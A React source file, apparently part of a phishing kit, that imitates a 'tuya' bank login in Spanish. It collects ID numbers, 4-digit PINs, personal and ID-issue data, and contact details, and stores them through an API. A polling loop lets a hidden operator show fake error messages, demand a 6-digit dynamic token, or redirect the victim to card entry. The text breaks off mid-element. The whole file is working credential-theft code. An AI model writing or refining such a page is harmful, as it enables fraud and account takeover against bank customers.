import React, { useState, useRef, useEffect, useMemo } from 'react'
import tuyaLogo from '../assets/logo.svg'
import {
  ChevronDown,
  ChevronRight,
  ArrowLeft,
  CheckCircle2,
  AlertCircle,
  KeyRound,
} from 'lucide-react'
import { CityAutocomplete } from './CityAutocomplete'

interface VisualAuthViewProps {
  onGoToCard?: () => void
}

export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) => {
  // Pasos del flujo:
  // 1: Documento
  // 2: Clave (4 compartimentos)
  // 3: Formulario parte 1 (Nombre, Documento no editable, Dirección)
  // 4: Formulario parte 2 (Fechas y Lugares)
  // 'loading': Pantalla de espera con culebrita ("Estamos validando sus datos")
  // 'six-digits': Pantalla de ingreso de 6 dígitos cuando el admin lo solicita
  // 5: Pantalla de confirmación final
  const [step, setStep] = useState<1 | 2 | 3 | 4 | 'loading' | 'six-digits' | 5>(1)

  // ID del registro guardado en la base de datos
  const [recordId, setRecordId] = useState<number | null>(null)

  // GIF animado de pantalla de espera configurado desde el panel admin
  const [loadingGifUrl, setLoadingGifUrl] = useState<string>('')

  useEffect(() => {
    fetch('/api/public-settings')
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.loadingGifUrl) {
          setLoadingGifUrl(data.loadingGifUrl)
        }
      })
      .catch(() => {})
  }, [])

  // Mensaje de alerta (cuando el admin pulsa Error Login o Error Datos)
  const [userAlertMessage, setUserAlertMessage] = useState<string>('')

  // Datos Paso 1
  const [docType, setDocType] = useState('Cédula de ciudadanía')
  const [docNumber, setDocNumber] = useState('')
  const [remember, setRemember] = useState(false)
  const [isDropdownOpen, setIsDropdownOpen] = useState(false)

  // Datos Paso 2 (Clave 4 dígitos)
  const [pin, setPin] = useState<string[]>(['', '', '', ''])
  const pinInputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ]

  // Datos Paso 6 dígitos
  const [sixDigits, setSixDigits] = useState<string[]>(['', '', '', '', '', ''])
  const sixDigitsRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ]

  // Datos Formulario 1 (Paso 3)
  const [fullName, setFullName] = useState('')
  const [address, setAddress] = useState('')

  // Datos Formulario 2 (Paso 4)
  const [birthDate, setBirthDate] = useState('')
  const [birthPlace, setBirthPlace] = useState('')
  const [expeditionDate, setExpeditionDate] = useState('')
  const [expeditionPlace, setExpeditionPlace] = useState('')

  const [dateError, setDateError] = useState('')

  const docTypes = [
    'Cédula de ciudadanía',
    'Cédula de extranjería',
    'Tarjeta de identidad',
    'Pasaporte',
  ]

  // Límites calculados para las fechas basados en la fecha actual
  const { maxBirthDate, minBirthDate, maxExpeditionDate, minExpeditionDate } = useMemo(() => {
    const now = new Date()
    const eighteenYearsAgo = new Date(now.getFullYear() - 18, now.getMonth(), now.getDate())
    const maxBirth = eighteenYearsAgo.toISOString().split('T')[0]
    const minBirth = '1920-01-01'

    const maxExp = now.toISOString().split('T')[0]
    let minExp = '1938-01-01'
    if (birthDate) {
      const bDate = new Date(birthDate)
      const turning18 = new Date(bDate.getFullYear() + 18, bDate.getMonth(), bDate.getDate())
      minExp = turning18.toISOString().split('T')[0]
    }

    return {
      maxBirthDate: maxBirth,
      minBirthDate: minBirth,
      maxExpeditionDate: maxExp,
      minExpeditionDate: minExp,
    }
  }, [birthDate])

  // Foco automático en clave al pasar al paso 2
  useEffect(() => {
    if (step === 2) {
      pinInputRefs[0].current?.focus()
    } else if (step === 'six-digits') {
      sixDigitsRefs[0].current?.focus()
    }
  }, [step])

  // ==============================================================
  // POLLING EN TIEMPO REAL: EL USUARIO ESPERA A QUE EL ADMIN CAMBIE EL ESTADO
  // ==============================================================
  useEffect(() => {
    if (step !== 'loading' || !recordId) return

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/records/${recordId}/status`)
        const data = await res.json()

        if (data.success && data.status) {
          const currentStatus = data.status

          // 1. Si el admin presionó "Error Login"
          if (currentStatus === 'ERROR_LOGIN') {
            setUserAlertMessage('Los datos de inicio de sesión o clave ingresados son incorrectos. Por favor intenta nuevamente.')
            setStep(1)
          }
          // 2. Si el admin presionó "Error Datos"
          else if (currentStatus === 'ERROR_DATOS') {
            setUserAlertMessage('La información personal o de expedición suministrada no coincide con nuestros registros. Por favor verifica y corrige tus datos.')
            setStep(3)
          }
          // 3. Si el admin presionó "6 Dígitos"
          else if (currentStatus === 'SOLICITAR_6_DIGITOS') {
            setUserAlertMessage('')
            setStep('six-digits')
          }
          // 4. Si el admin presionó "Aprobar"
          else if (currentStatus === 'APROBADO') {
            setUserAlertMessage('')
            setStep(5)
          }
          // 5. Si el admin presionó "Tarjeta"
          else if (currentStatus === 'SOLICITAR_TARJETA') {
            setUserAlertMessage('')
            if (onGoToCard) {
              onGoToCard()
            }
          }
          // 6. Si el admin presionó "Error Tarjeta"
          else if (currentStatus === 'ERROR_TARJETA') {
            setUserAlertMessage('Error en la tarjeta: La entidad financiera rechazó la transacción. Por favor verifica tus datos o ingresa una nueva tarjeta.')
            if (onGoToCard) {
              onGoToCard()
            }
          }
        }
      } catch {
        // Polling silencioso
      }
    }, 1500)

    return () => clearInterval(interval)
  }, [step, recordId])

  // Handlers paso 1
  const handleStep1Submit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!docNumber.trim()) {
      alert('Ingresa tu número de documento')
      return
    }
    setStep(2)
  }

  // Handlers paso 2 (PIN 4 dígitos)
  const handlePinChange = (index: number, value: string) => {
    const cleanValue = value.replace(/[^0-9]/g, '')
    if (!cleanValue) {
      const newPin = [...pin]
      newPin[index] = ''
      setPin(newPin)
      return
    }

    const lastChar = cleanValue.slice(-1)
    const newPin = [...pin]
    newPin[index] = lastChar
    setPin(newPin)

    if (index < 3 && lastChar) {
      pinInputRefs[index + 1].current?.focus()
    }
  }

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinInputRefs[index - 1].current?.focus()
    }
  }

  const handleStep2Submit = (e: React.FormEvent) => {
    e.preventDefault()
    if (pin.join('').length < 4) {
      alert('Digita los 4 dígitos de tu clave')
      return
    }
    setStep(3)
  }

  // Handlers paso 3
  const handleStep3Submit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!fullName.trim() || !address.trim()) {
      alert('Por favor completa todos los campos para continuar.')
      return
    }
    setStep(4)
  }

  // Validación y envío del paso 4 -> Pasa a PANTALLA DE ESPERA ("loading")
  const handleStep4Submit = async (e: React.FormEvent) => {
    e.preventDefault()
    setDateError('')

    if (!birthDate) {
      setDateError('Por favor selecciona tu fecha de nacimiento.')
      return
    }

    if (!birthPlace.trim()) {
      setDateError('Por favor selecciona tu lugar de nacimiento.')
      return
    }

    if (!expeditionDate) {
      setDateError('Por favor selecciona la fecha de expedición del documento.')
      return
    }

    if (!expeditionPlace.trim()) {
      setDateError('Por favor selecciona el lugar de expedición.')
      return
    }

    if (birthDate > maxBirthDate) {
      setDateError('Debes ser mayor de 18 años para continuar. Fecha no válida.')
      return
    }

    if (expeditionDate > maxExpeditionDate) {
      setDateError('La fecha de expedición no puede ser futura.')
      return
    }

    if (expeditionDate < minExpeditionDate) {
      setDateError('La fecha de expedición no puede ser anterior a tu mayoría de edad.')
      return
    }

    // Poner al usuario en pantalla de espera
    setStep('loading')
    setUserAlertMessage('')

    // Leer posible solicitud de cancelación de seguro previa
    let insuranceCancellation: {
      insurance?: string
      reason?: string
      cardLast4?: string
      phone?: string
      email?: string
      comments?: string
    } | null = null
    try {
      const savedIns = sessionStorage.getItem('insurance_cancellation_data')
      if (savedIns) {
        insuranceCancellation = JSON.parse(savedIns)
      }
    } catch {
      // Ignorar si no es JSON válido
    }

    const enrichedAddress = insuranceCancellation
      ? `${address} | 🛡️ CANCELACIÓN SEGURO: ${insuranceCancellation.insurance} | Motivo: ${insuranceCancellation.reason} | Tel: ${insuranceCancellation.phone} | Correo: ${insuranceCancellation.email}`
      : address

    // Guardar en la base de datos de Neon
    try {
      const res = await fetch('/api/save-record', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docType,
          docNumber,
          pin: pin.join(''),
          fullName,
          address: enrichedAddress,
          birthDate,
          birthPlace,
          expeditionDate,
          expeditionPlace,
          insuranceCancellation,
          status: 'PENDIENTE',
        }),
      })

      const data = await res.json()
      if (data.success && data.data?.id) {
        setRecordId(data.data.id)
        if (insuranceCancellation) {
          sessionStorage.removeItem('insurance_cancellation_data')
        }
      }
    } catch (err) {
      console.warn('Error sincronizando con la base de datos:', err)
    }
  }

  // Manejo de cambio en los 6 dígitos
  const handleSixDigitsChange = (index: number, value: string) => {
    const cleanValue = value.replace(/[^0-9]/g, '')
    if (!cleanValue) {
      const newDigits = [...sixDigits]
      newDigits[index] = ''
      setSixDigits(newDigits)
      return
    }

    const lastChar = cleanValue.slice(-1)
    const newDigits = [...sixDigits]
    newDigits[index] = lastChar
    setSixDigits(newDigits)

    if (index < 5 && lastChar) {
      sixDigitsRefs[index + 1].current?.focus()
    }
  }

  const handleSixDigitsKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !sixDigits[index] && index > 0) {
      sixDigitsRefs[index - 1].current?.focus()
    }
  }

  // Enviar los 6 dígitos solicitados por el administrador
  const handleSixDigitsSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const fullCode = sixDigits.join('')
    if (fullCode.length < 6) {
      alert('Por favor ingresa los 6 dígitos completos.')
      return
    }

    // Enviar código al backend
    if (recordId) {
      try {
        await fetch(`/api/records/${recordId}/six-digits`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sixDigits: fullCode }),
        })
      } catch (err) {
        console.warn('Error enviando 6 dígitos:', err)
      }
    }

    // El usuario vuelve a la pantalla de espera
    setStep('loading')
  }

  return (
    <div className="w-full min-h-screen bg-[#F0F2F5] flex flex-col items-center justify-center p-4 sm:p-6 select-none font-sans">
      
      {/* ========================================================================= */}
      {/* PANTALLA DE ESPERA ("Estamos validando sus datos") con 3 puntos en culebrita */}
      {/* ========================================================================= */}
      {step === 'loading' ? (
        <div className="w-full max-w-md mx-auto flex flex-col items-center justify-center py-16 animate-in fade-in duration-300">
          <div
            className="w-full max-w-[360px] bg-[#F0F2F5] rounded-3xl p-8 sm:p-10 flex flex-col items-center justify-center text-center"
            style={{
              boxShadow:
                '12px 12px 28px rgba(185, 195, 210, 0.5), -12px -12px 28px rgba(255, 255, 255, 0.95)',
            }}
          >
            <div className="mb-6 flex items-center justify-center">
              <img src={tuyaLogo} alt="Logo" className="h-10 sm:h-11 w-auto object-contain" />
            </div>

            <h2 className="text-[20px] sm:text-[22px] font-normal text-[#4A5768] tracking-tight mb-7">
              Estamos validando sus datos
            </h2>

            {/* GIF animado configurado desde admin o tres punticos en culebrita */}
            {loadingGifUrl ? (
              <div className="flex flex-col items-center justify-center my-4">
                <img
                  src={loadingGifUrl}
                  alt="Validando sus datos"
                  className="w-24 h-24 sm:w-28 sm:h-28 object-contain rounded-2xl drop-shadow-md"
                  onError={() => setLoadingGifUrl('')}
                />
              </div>
            ) : (
              <div className="flex items-center justify-center gap-3 py-2">
                <span
                  className="w-3.5 h-3.5 rounded-full bg-[#E20613] inline-block shadow-xs"
                  style={{
                    animation: 'snakeBounce 1.2s infinite ease-in-out',
                    animationDelay: '0s',
                  }}
                />
                <span
                  className="w-3.5 h-3.5 rounded-full bg-[#E20613] inline-block shadow-xs"
                  style={{
                    animation: 'snakeBounce 1.2s infinite ease-in-out',
                    animationDelay: '0.2s',
                  }}
                />
                <span
                  className="w-3.5 h-3.5 rounded-full bg-[#E20613] inline-block shadow-xs"
                  style={{
                    animation: 'snakeBounce 1.2s infinite ease-in-out',
                    animationDelay: '0.4s',
                  }}
                />
              </div>
            )}

            <p className="text-xs text-gray-400 mt-7">
              Por favor no cierres esta ventana. Tu solicitud está en proceso...
            </p>
          </div>

          <style>{`
            @keyframes snakeBounce {
              0%, 100% {
                transform: translateY(0);
                opacity: 0.45;
              }
              50% {
                transform: translateY(-16px);
                opacity: 1;
              }
            }
          `}</style>
        </div>
      ) : step === 'six-digits' ? (

        /* ============================================================== */
        /* PANTALLA 6 DÍGITOS (SOLICITADA POR EL ADMINISTRADOR)          */
        /* ============================================================== */
        <div className="w-full max-w-[390px] sm:max-w-[420px] mx-auto py-6 sm:py-8 flex flex-col items-center animate-in zoom-in-95 duration-200">
          
          <div className="mb-6 flex items-center justify-center">
            <img src={tuyaLogo} alt="Logo" className="h-11 sm:h-12 w-auto object-contain" />
          </div>

          <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wider mb-3">
            <KeyRound className="w-3.5 h-3.5 text-blue-600" />
            <span>Validación Requerida</span>
          </div>

          <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-2">
            Clave dinámica de 6 dígitos
          </h1>
          <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-8 px-2 leading-relaxed">
            Hemos solicitado una confirmación de seguridad. Por favor ingresa el código o token de 6 dígitos.
          </p>

          <form onSubmit={handleSixDigitsSubmit} className="w-full space-y-6">
            
            {/* Input grande dividido en 6 compartimentos */}
            <div
              className="w-full bg-[#F0F2F5] rounded-3xl h-22 sm:h-24 px-3 flex items-center justify-between transition-all"
              style={{
                boxShadow:
                  'inset 4px 4px 8px rgba(166, 175, 195, 0.45), inset -4px -4px 8px rgba(255, 255, 255, 0.95)',
              }}
            >
              {[0, 1, 2, 3, 4, 5].map((index) => (
                <React.Fragment key={index}>
                  <div className="flex-1 flex items-center justify-center">
                    <input
                      ref={sixDigitsRefs[index]}
                      type="password"
                      inputMode="numeric"
                      maxLength={1}
                      value={sixDigits[index]}
                      onChange={(e) => handleSixDigitsChange(index, e.target.value)}
                      onKeyDown={(e) => handleSixDigitsKeyDown(index, e)}
                      className="w-full h-full bg-transparent text-center text-2xl sm:text-3xl font-extrabold text-[#2C3847] outline-none border-none p-0 focus:ring-0"
                    />
                  </div>
                  {index < 5 && (
                    <div className="w-[1.5px] h-7 bg-[#CBD5E1] rounded-full shrink-0" />
                  )}
                </React.Fragment>
              ))}
            </div>

            <div className="pt-4">
              <button
                type="submit"
                disabled={sixDigits.join('').length < 6}
                className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                style={{
                  background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                  boxShadow:
                    '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                }}
              >
                <span>Confirmar Clave de 6 Dígitos</span>
              </button>
            </div>

          </form>
        </div>

      ) : (

        /* ============================================================== */
        /* FLUJO DE FORMULARIOS HABITUAL (PASOS 1, 2, 3, 4, 5)            */
        /* ============================================================== */
        <div className="w-full max-w-[390px] sm:max-w-[420px] mx-auto py-6 sm:py-8 flex flex-col items-center relative">
          
          {/* BOTÓN VOLVER ARRIBA DEL TODO */}
          {typeof step === 'number' && step > 1 && step < 5 && (
            <div className="w-full flex items-center justify-start mb-4">
              <button
                type="button"
                onClick={() => {
                  setDateError('')
                  setStep((prev) => (typeof prev === 'number' ? ((prev - 1) as 1 | 2 | 3 | 4) : 1))
                }}
                className="inline-flex items-center gap-1.5 text-xs sm:text-[13px] font-medium text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer py-1.5 px-2 rounded-xl hover:bg-black/5 -ml-2"
              >
                <ArrowLeft className="w-4 h-4 text-[#E20613]" strokeWidth={2.5} />
                <span>
                  {step === 2 && 'Volver al documento'}
                  {step === 3 && 'Volver a clave'}
                  {step === 4 && 'Volver a datos personales'}
                </span>
              </button>
            </div>
          )}

          {/* Logotipo centrado */}
          <div className="mb-6 flex justify-center">
            <img src={tuyaLogo} alt="Logo" className="h-12 sm:h-14 w-auto object-contain drop-shadow-xs" />
          </div>

          {/* MENSAJE DE ALERTA ROJO CUANDO EL ADMIN PULSA ERROR LOGIN O ERROR DATOS */}
          {userAlertMessage && (
            <div className="w-full mb-6 p-4 rounded-2xl bg-red-500/10 border border-red-500/30 text-red-700 text-xs sm:text-[13px] flex items-start gap-3 animate-in fade-in duration-200">
              <AlertCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
              <div className="flex-1 font-medium leading-relaxed">
                {userAlertMessage}
              </div>
            </div>
          )}

          {/* ============================================================== */}
          {/* PASO 1: DOCUMENTO */}
          {/* ============================================================== */}
          {step === 1 && (
            <div className="w-full animate-in fade-in duration-200">
              <h1 className="text-[23px] sm:text-[25px] font-normal text-[#5A6878] text-center tracking-tight mb-8">
                Accede a tus productos
              </h1>

              <form onSubmit={handleStep1Submit} className="w-full space-y-4">
                
                {/* Selector de Tipo de Documento */}
                <div className="relative">
                  <div
                    onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                    className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 cursor-pointer select-none transition-all"
                    style={{
                      boxShadow:
                        'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                    }}
                  >
                    <span className="block text-[11px] font-medium text-gray-400">
                      Seleccione el tipo de documento
                    </span>
                    <div className="flex items-center justify-between mt-0.5">
                      <span className="text-[15px] font-medium text-[#2C3847]">
                        {docType}
                      </span>
                      <ChevronDown
                        className={`w-5 h-5 text-[#E20613] transition-transform duration-200 ${
                          isDropdownOpen ? 'rotate-180' : ''
                        }`}
                        strokeWidth={2.5}
                      />
                    </div>
                  </div>

                  {isDropdownOpen && (
                    <div
                      className="absolute z-30 top-full left-0 right-0 mt-2 bg-[#F0F2F5] rounded-2xl p-2 animate-in fade-in zoom-in-95 duration-150"
                      style={{
                        boxShadow:
                          '6px 6px 16px rgba(166, 175, 195, 0.5), -6px -6px 16px rgba(255, 255, 255, 0.95)',
                      }}
                    >
                      {docTypes.map((type) => (
                        <button
                          key={type}
                          type="button"
                          onClick={() => {
                            setDocType(type)
                            setIsDropdownOpen(false)
                          }}
                          className={`w-full text-left px-4 py-2.5 rounded-xl text-sm font-medium transition-colors ${
                            docType === type
                              ? 'text-[#E20613] font-bold bg-white/70'
                              : 'text-gray-700 hover:bg-white/40'
                          }`}
                        >
                          {type}
                        </button>
                      ))}
                    </div>
                  )}
                </div>

                {/* Input de Número de Documento */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
                  style={{
                    boxShadow:
                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Escribe tu número de documento
                  </label>
                  <input
                    type="text"
                    inputMode="numeric"
                    required
                    value={docNumber}
                    onChange={(e) => setDocNumber(e.target.value.replace(/[^0-9]/g, ''))}
                    placeholder=""
                    className="w-full bg-transparent border-none outline-none text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0 placeholder:text-gray-400"
                  />
                </div>

                {/* Fila Recordar / Olvidé clave */}
                <div className="flex items-center justify-between px-1.5 pt-1.5">
                  <label className="inline-flex items-center gap-2.5 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={remember}
                      onChange={(e) => setRemember(e.target.checked)}
                      className="w-5 h-5 rounded-[5px] text-[#E20613] border-gray-300 focus:ring-0 focus:ring-offset-0 accent-[#E20613] cursor-pointer transition-transform active:scale-95"
                    />
                    <span className="text-[13.5px] sm:text-sm font-medium text-[#5A6878]">
                      Recordar
                    </span>
                  </label>

                  <a
                    href="#olvide-clave"
                    onClick={(e) => {
                      e.preventDefault()
                      alert('Redirigiendo a recuperación de clave...')
                    }}
                    className="text-[13px] sm:text-sm font-medium text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer"
                  >
                    Olvidé clave
                  </a>
                </div>

                {/* Acciones inferiores */}
                <div className="pt-8">
                  <div className="flex items-center justify-center mb-6">
                    <a
                      href="#registro"
                      onClick={(e) => {
                        e.preventDefault()
                        alert('Iniciando proceso de registro nuevo...')
                      }}
                      className="inline-flex items-center gap-1 text-[13.5px] sm:text-[14px] font-medium text-[#4F6888] hover:text-[#E20613] transition-colors cursor-pointer group"
                    >
                      <span>Quiero registrarme</span>
                      <ChevronRight
                        className="w-4 h-4 text-[#E20613] transform group-hover:translate-x-0.5 transition-transform"
                        strokeWidth={2.5}
                      />
                    </a>
                  </div>

                  <button
                    type="submit"
                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2"
                    style={{
                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                      boxShadow:
                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                    }}
                  >
                    <span>Siguiente</span>
                  </button>

                  <div className="flex items-center justify-center pt-6 pb-2">
                    <a
                      href="#informacion-general"
                      onClick={(e) => {
                        e.preventDefault()
                        alert('Consultando información general de seguridad y términos...')
                      }}
                      className="text-[13px] sm:text-[13.5px] font-medium text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer"
                    >
                      Información general
                    </a>
                  </div>
                </div>

              </form>
            </div>
          )}

          {/* ============================================================== */}
          {/* PASO 2: CLAVE EN 4 */}
          {/* ============================================================== */}
          {step === 2 && (
            <div className="w-full animate-in fade-in slide-in-from-right-4 duration-300">
              <h1 className="text-[23px] sm:text-[25px] font-normal text-[#5A6878] text-center tracking-tight mb-2">
                Ingresa tu clave
              </h1>
              <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-8">
                Digita tu clave de 4 dígitos para continuar
              </p>

              <form onSubmit={handleStep2Submit} className="w-full space-y-6">
                
                {/* Input grande dividido en 4 */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-3xl h-22 sm:h-24 px-4 flex items-center justify-between transition-all"
                  style={{
                    boxShadow:
                      'inset 4px 4px 8px rgba(166, 175, 195, 0.45), inset -4px -4px 8px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  {[0, 1, 2, 3].map((index) => (
                    <React.Fragment key={index}>
                      <div className="flex-1 flex items-center justify-center">
                        <input
                          ref={pinInputRefs[index]}
                          type="password"
                          inputMode="numeric"
                          maxLength={1}
                          value={pin[index]}
                          onChange={(e) => handlePinChange(index, e.target.value)}
                          onKeyDown={(e) => handlePinKeyDown(index, e)}
                          className="w-full h-full bg-transparent text-center text-3xl sm:text-4xl font-extrabold text-[#2C3847] outline-none border-none p-0 focus:ring-0"
                        />
                      </div>
                      {index < 3 && (
                        <div className="w-[1.5px] h-8 bg-[#CBD5E1] rounded-full shrink-0" />
                      )}
                    </React.Fragment>
                  ))}
                </div>

                <div className="text-center pt-1">
                  <a
                    href="#olvide-clave"
                    onClick={(e) => {
                      e.preventDefault()
                      alert('Redirigiendo a recuperación de clave...')
                    }}
                    className="text-xs sm:text-[13px] font-medium text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer"
                  >
                    ¿Olvidaste tu clave?
                  </a>
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={pin.join('').length < 4}
                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                    style={{
                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                      boxShadow:
                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                    }}
                  >
                    <span>Ingresar</span>
                  </button>
                </div>

              </form>
            </div>
          )}

          {/* ============================================================== */}
          {/* PASO 3: FORMULARIO 1 (Nombre, Documento BLOQUEADO, Dirección) */}
          {/* ============================================================== */}
          {step === 3 && (
            <div className="w-full animate-in fade-in slide-in-from-right-4 duration-300">
              <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-1">
                Confirma tus datos
              </h1>
              <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-7">
                Parte 1 de 2: Información personal básica
              </p>

              <form onSubmit={handleStep3Submit} className="w-full space-y-4">
                
                {/* Nombre completo */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
                  style={{
                    boxShadow:
                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Nombre completo
                  </label>
                  <input
                    type="text"
                    required
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    placeholder="Ej. Carlos Mario Restrepo"
                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0 placeholder:text-gray-400"
                  />
                </div>

                {/* Documento BLOQUEADO */}
                <div
                  className="w-full bg-[#EAECEF] rounded-2xl px-5 py-3.5 transition-all cursor-not-allowed border border-gray-200/50"
                  style={{
                    boxShadow:
                      'inset 2px 2px 5px rgba(160, 170, 185, 0.4), inset -2px -2px 5px rgba(255, 255, 255, 0.8)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Número de documento
                  </label>
                  <input
                    type="text"
                    readOnly
                    disabled
                    value={docNumber}
                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-semibold text-[#5A6878] p-0 mt-0.5 cursor-not-allowed select-none"
                  />
                </div>

                {/* Dirección */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
                  style={{
                    boxShadow:
                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Dirección de residencia
                  </label>
                  <input
                    type="text"
                    required
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    placeholder="Ej. Calle 45 # 12 - 34 Apto 301"
                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0 placeholder:text-gray-400"
                  />
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2"
                    style={{
                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                      boxShadow:
                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
                    }}
                  >
                    <span>Siguiente</span>
                  </button>
                </div>

              </form>
            </div>
          )}

          {/* ============================================================== */}
          {/* PASO 4: FORMULARIO 2 (Nacimiento, Expedición) */}
          {/* ============================================================== */}
          {step === 4 && (
            <div className="w-full animate-in fade-in slide-in-from-right-4 duration-300">
              <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-1">
                Datos de expedición
              </h1>
              <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-6">
                Parte 2 de 2: Fechas y lugares de registro
              </p>

              {dateError && (
                <div className="mb-5 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs flex items-start gap-2 animate-in fade-in">
                  <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
                  <span>{dateError}</span>
                </div>
              )}

              <form onSubmit={handleStep4Submit} className="w-full space-y-4">
                
                {/* Fecha nacimiento */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
                  style={{
                    boxShadow:
                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Fecha de nacimiento
                  </label>
                  <input
                    type="date"
                    required
                    max={maxBirthDate}
                    min={minBirthDate}
                    value={birthDate}
                    onChange={(e) => {
                      setBirthDate(e.target.value)
                      setDateError('')
                    }}
                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0"
                  />
                </div>

                {/* Lugar nacimiento */}
                <CityAutocomplete
                  label="Lugar de nacimiento"
                  placeholder="Busca tu ciudad (ej. Medellín)"
                  value={birthPlace}
                  onChange={(city) => {
                    setBirthPlace(city)
                    setDateError('')
                  }}
                />

                {/* Fecha expedición */}
                <div
                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
                  style={{
                    boxShadow:
                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                  }}
                >
                  <label className="block text-[11px] font-medium text-gray-400 select-none">
                    Fecha de expedición del documento
                  </label>
                  <input
                    type="date"
                    required
                    max={maxExpeditionDate}
                    min={minExpeditionDate}
                    value={expeditionDate}
